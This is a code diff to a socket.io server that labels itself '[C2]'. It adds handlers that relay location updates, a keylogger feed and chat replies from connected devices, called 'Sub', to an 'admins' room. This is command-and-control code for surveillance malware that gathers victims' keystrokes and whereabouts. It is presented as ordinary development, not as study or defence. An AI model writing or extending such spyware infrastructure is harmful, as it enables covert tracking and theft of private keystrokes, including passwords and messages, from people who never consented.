@@ -82,6 +82,23 @@ io.on('connection', (socket) => {
         }
     });
 
+    // Relay location data back to admins
+    socket.on('location_update', (data) => {
+        io.to('admins').emit('location_result', data);
+    });
+
+    // Relay keylogger feed back to admins
+    socket.on('keylog_event', (data) => {
+        io.to('admins').emit('keylog_feed', data);
+    });
+    
+    // Relay chat from Sub back to Admin
+    socket.on('chat_reply', (data) => {
+        // Find sender
+        const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
+        io.to('admins').emit('chat_reply', { from: subId, text: data.text });
+    });
+
     socket.on('disconnect', () => {
         console.log(`[C2] Disconnected: ${socket.id}`);
         if (connectedDevices[socket.id]) {
